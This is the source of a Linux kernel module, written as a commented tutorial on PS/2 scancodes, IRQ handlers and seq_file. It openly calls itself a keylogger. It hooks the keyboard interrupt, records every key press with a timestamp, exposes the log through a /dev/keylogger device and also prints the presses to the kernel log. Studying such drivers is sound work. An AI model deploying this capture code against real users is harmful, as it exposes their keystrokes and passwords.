#include <linux/module.h>
#include <linux/seq_file.h>
#include <linux/kernel.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/interrupt.h>

// A hacky DSL to define a keyboard layout. Still looking for a way that doesn't
// involve creating a function :/.
#define START_LAYOUT(NAME) static void init_##NAME (void) { int i = 0; struct keylog_key *set = NAME;
#define END_LAYOUT }

struct keylog_key {
	char *name;
	char ascii_lower_val;
	// TODO: ascii_upper_val ? numlock ?
};

// A K is a key whose name is its ASCII representation.
#define K(ASCII) set[i++] = (struct keylog_key) { .name = ASCII, .ascii_lower_val = ASCII[0] }
// A KN is a key without an ascii value, just a name
#define KN(NAME) set[i++] = (struct keylog_key) { .name = NAME, .ascii_lower_val = 0 }
// A KAN is an ascii key with a different name than its ascii value
#define KAN(ASCII, NAME) set[i++] = (struct keylog_key) { .name = NAME, .ascii_lower_val = ASCII }
// A KUNK is an unknown key
#define KUNK set[i++] = (struct keylog_key) { 0 };

// Let's check out how the PS/2 protocol works.
//
// PS/2 keyboards are a bit of a complex beast. The original IBM PC XT keyboard
// uses a fairly simple system where each key is represented by a 7 bit code,
// which basically represents its position on the keyboard. If you are using a
// different layout (say, AZERTY french keyboard), the XT keyboard will still
// send the same code. It is up to the kernel to interpret it with the right
// layout.
//
// We're going to define an array for all the codes of the original IBM XT
// keyboard. The index is the 7-bit key code, and the value is a struct
// keylog_key. We'll be hardcoding the standard US layout.
//
// TODO: Find a simple way to handle multiple layouts. Can I even find the
// layout currently used by the kernel ?
//
// An image of the keyboard : https://www.win.tue.nl/~aeb/linux/kbd/xtkbd.jpg
static struct keylog_key scancode_set1[0x59];

START_LAYOUT(scancode_set1)
	KUNK; // error
	// Main keyboard layout
	KN("ESC");   K("1");  K("2"); K("3"); K("4"); K("5"); K("6"); K("7"); K("8"); K("9"); K("0"); K("-"); K("="); KAN('\b', "BKSP");
	KN("TAB");   K("Q");  K("W"); K("E"); K("R"); K("T"); K("Y"); K("U"); K("I"); K("O"); K("P"); K("["); K("]"); KAN('\n', "ENTER");
	KN("LCTRL"); K("A");  K("S"); K("D"); K("F"); K("G"); K("H"); K("J"); K("K"); K("L"); K(";"); K("'"); K("`"); /* ENTER */
	KN("LSHFT"); K("\\"); K("Z"); K("X"); K("C"); K("V"); K("B"); K("N"); K("M"); K(","); K("."); K("/"); KN("RSHFT"); KAN('*', "KP *");
	KN("LALT");                           KAN(' ', "SPACE");                                              KN("CAPS");

	// Function keys. The original XT had them on the left side of the keyboard;
	// 2 column per row.
	KN("F1"); KN("F2"); KN("F3"); KN("F4"); KN("F5"); KN("F6"); KN("F7"); KN("F8"); KN("F9"); KN("F10");

	// Numpad. It's located on the right of the Main keyboard layout.
	KN("NUM");       KN("SCROLL");
	KAN('7', "KP 7"); KAN('8', "KP 8"); KAN('9', "KP 9"); KAN('-', "KP -");
	KAN('4', "KP 4"); KAN('5', "KP 5"); KAN('6', "KP 6"); KAN('+', "KP +");
	KAN('1', "KP 1"); KAN('2', "KP 2"); KAN('3', "KP 3"); //    KP +
	KAN('0', "KP 0");   KAN('.', "KP .");                 //    KP +

	// unused
	KUNK; KUNK; KUNK;

	// Unofficial F11 and F12 keys; used by some XT-compatible keyboards
	KN("F11"); KN("F12");
END_LAYOUT

int scanset_contains(int scancode) {
	return 0 <= scancode && scancode < sizeof(scancode_set1) / sizeof(*scancode_set1);
}

// When reading a key from the keyboard, we'll get a bit telling us if the key
// is being pressed or released.
#define KEY_PRESS 0
#define KEY_RELEASE 1

// We don't store the name or ascii value here because it takes more bytes, and
// given that I'm going to be handling this in a hard-IRQ context, the smaller
// the allocation the better.
struct keylog_entry {
	struct list_head keylog_list;
	struct timespec time;
	int keycode;
	int state;
};

// The main structure we'll keep around. Allows having multiple keylogger files
// open at the same time.
struct keylog_list {
	struct list_head head;
	wait_queue_head_t queue;
};

// So seqlist have a bit of an odd behavior when it comes to how it returns.
// It makes sense, but it's non-obvious. seq_read will call the next function
// until it returns NULL, and then return all that data to userspace. If you
// want to EOF, you need to return NULL from start.
//
// Here's a link that explains it really well :
// http://www.tldp.org/LDP/lkmpg/2.6/html/x861.html
//
// This is important in our case because it means we should avoid sleeping from
// next at all costs ! Instead, we should return NULL when we have no more data
// ready in next, and do all the sleeping in start.
static void *device_seq_start(struct seq_file *file, loff_t *pos) {
	struct keylog_list *list = (struct keylog_list*)file->private;
	struct list_head *start;
	int sig = 0;
	int mypos = *pos;

	BUG_ON(list == NULL);
	start = &list->head;
	// So, linked lists. The way they work on linux is a bit unintuitive, but
	// allow for some fairly clean code, once you understand them. The first
	// thing to "get" is that linked list in linux are really circular lists.
	// Furthermore, the list "head" is just a dummy node. As such, a linked list
	// just has one node that links to itself ! Furthermore, it means the first
	// entry is actually LIST_HEAD->next.
	do {
		// If the condition given to wait_event is true at the time it's called,
		// we won't wait at all. This helps avoid potential race conditions
		// between checking for the condition and then calling wait_event.
		sig = wait_event_interruptible(list->queue, start->next != &list->head);
		if (sig)
			return ERR_PTR(-EINTR);
		start = start->next;
	} while (mypos-- != 0);
	return start;
}

static void *device_seq_next(struct seq_file *file, void *data, loff_t *pos) {
	struct keylog_list *list = (struct keylog_list*)file->private;

	BUG_ON(list == NULL);
	// seq_list_next will walk the list until it reaches the end. When it does,
	// it will return NULL. This NULL doesn't mean we've reached the end of the
	// file, however. It just means that the `read` syscall should return
	// everything it has read up till now.
	//
	// If you really want to return 0 (like, EOF), you need to return NULL from
	// seq_start instead.
	return seq_list_next(data, &list->head, pos);
}

static void seq_print_time(struct seq_file *s, struct timespec tm) {
	return seq_printf(s, "%.2lu:%.2lu:%.2lu", (tm.tv_sec / (60 * 60)) % 24, (tm.tv_sec / 60) % 60, tm.tv_sec % 60);
}

static int device_seq_show(struct seq_file *s, void *data) {
	struct keylog_entry *e = list_entry(data, struct keylog_entry, keylog_list);
	char *name;

	BUG_ON(e == NULL);
	seq_puts(s, "Keylog: ");
	seq_print_time(s, e->time);
	if (scanset_contains(e->keycode)) {
		name = scancode_set1[e->keycode].name;
		seq_printf(s, " - %#.2x (%s) %s\n", e->keycode, name, e->state == KEY_PRESS ? "Pressed" : "Released");
	} else
		seq_printf(s, " - %#.2x (INVALID) %s\n", e->keycode, e->state == KEY_PRESS ? "Pressed" : "Released");
	return 0;
}

static void device_seq_stop(struct seq_file *seq, void *v) {
}

static struct seq_operations keylog_seq_ops = {
	.start = device_seq_start,
	.next = device_seq_next,
	.show = device_seq_show,
	.stop = device_seq_stop
};

// PS2 commands can come from multiple places. In our case, we'll mostly handle
// the i8042 controller, which is the PS/2 controller present in basically every
// laptop and X86 computer in existance. It's also what qemu emulates for
// keyboard input.
static irqreturn_t keylog_irq_handler(int irq,  void *dev) {
	struct keylog_list *list = (struct keylog_list*)dev;
	struct keylog_entry *e;

	// We know a key was pressed, but now we need to know which key ! For this,
	// we need to read IO port 0x60. It will have our scancode, which we can
	// then decode with the scanset array declared above.
	//
	// A note on IO-Ports : you can read multiple times from it, it will always
	// yield the same value. I *suppose* that it's really just reading the
	// current value of a pin - Think Arduino GPIO.
	int scancode = inb(0x60);

	// The eigth bit of a scancode encodes the current state of the key : if it
	// is set, then the key was released, otherwise it was pressed.
	int state = scancode & 0x80;
	scancode &= 0x7f;

	// We're in a Hardware Interrupt handler, and this leads to extreme
	// limitations in what we can do ! Basically, while handling a Hard-IRQ,
	// the CPU cannot issue another IRQ - it must wait for us to finish handling
	// this one. But, for instance, waking up from sleeping requires the CPU to
	// issue an IRQ. But it can't, because we're already in the middle of
	// handling one !
	//
	// For this reason, we are not allowed to sleep - or do any operations that
	// need sleeping - while handling an IRQ. The "default" kmalloc mode,
	// GFP_KERNEL, allows the kernel to sleep in order to allocate more memory.
	// We can't allow that, so instead we use GFP_ATOMIC.
	if ((e = kmalloc(sizeof(struct keylog_entry), GFP_ATOMIC)) == NULL) {
		// TODO: Welp, error. Not too sure what to do in this case, so we'll
		// just act as if that key was never pressed/released in the first place
		return IRQ_HANDLED;
	}

	e->keycode = scancode;
	e->state = state;

	// Jiffies is the simplest way to get the time, and involves no sleeping.
	jiffies_to_timespec(jiffies, &e->time);

	BUG_ON(list == NULL);
	list_add_tail(&e->keylog_list, &list->head);

	// Wake_up is safe to call in hard-irq context too.
	wake_up_interruptible(&list->queue);

	return IRQ_HANDLED;
}

int keylog_device_open(struct inode *inode, struct file *file) {
	int ret = 0;
	struct keylog_list *list;

	// Initialize the keylogger structure that will be passed to the file and
	// irq handler.
	if ((list = kmalloc(sizeof(struct keylog_list), GFP_KERNEL)) == NULL) {
		return -ENOMEM;
	}
	INIT_LIST_HEAD(&list->head);
	init_waitqueue_head(&list->queue);

	// When a key is pressed on the keyboard, an interruption will be sent to
	// the CPU. An interruption is basically a way for a device to tell the CPU
	// "Something happened ! React to it!". The linux kernel has a centralized
	// system to handle interrupts, through the `request_threaded_irq` function.
	// Through it, we can tell linux to call our function whenever it receives
	// an interruption.
	//
	// TODO: There is some funny business concerning "interuption sharing". Not
	// too sure if it concerns me, maybe I should do more research ? It seems
	// to be working well either way...
	if ((ret = request_irq(1, keylog_irq_handler, IRQF_SHARED, "keylog", list)) < 0)
		goto free;

	// File->private_data contains a reference to the misc_device object. We
	// don't need it, and seq_open has a warning when it sees private_data is
	// set. NULL it to silence the warning.
	file->private_data = NULL;
	if ((ret = seq_open(file, &keylog_seq_ops)) < 0)
		goto release_irq;

	// Put our list structure somewhere the seq operations can access them
	((struct seq_file*)file->private_data)->private = list;
	return 0;

release_irq:
	free_irq(1, list);
free:
	kfree(list);
	return ret;
}

int keylog_device_release(struct inode *inode, struct file *file) {
	struct keylog_list *list = ((struct seq_file*)file->private_data)->private;
	struct list_head *cur;
	struct list_head *q;
	struct keylog_entry *e;

	free_irq(1, list);

	// Print the keypresses to the kernel log as I clean up the data-structure.
	list_for_each_safe(cur, q, &list->head) {
		e = list_entry(cur, struct keylog_entry, keylog_list);

		if (scanset_contains(e->keycode) && e->state == KEY_PRESS)
			printk(KERN_INFO "Keylog: %#.2x (%s) - %s\n", e->keycode, scancode_set1[e->keycode].name, e->state == KEY_PRESS ? "Pressed" : "Released");

		list_del(cur);
		kfree(e);
	}
	kfree(list);
	return 0;
}

static struct file_operations keylog_device_fops = {
	.open = keylog_device_open,
	.read = seq_read,
	.llseek = seq_lseek,
	.release = keylog_device_release
};

static struct miscdevice keylog_device = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = "keylogger",
	.fops = &keylog_device_fops
};

int init_module(void) {
	// I wish I didn't have to do this, but otherwise my pretty macros don't
	// work. I blame C.
	init_scancode_set1();
	return misc_register(&keylog_device);
}

void cleanup_module(void) {
	return misc_deregister(&keylog_device);
}

MODULE_LICENSE("Dual MIT/GPL");
MODULE_AUTHOR("roblabla");
MODULE_DESCRIPTION("A keyboard driver. Also a keylogger.");
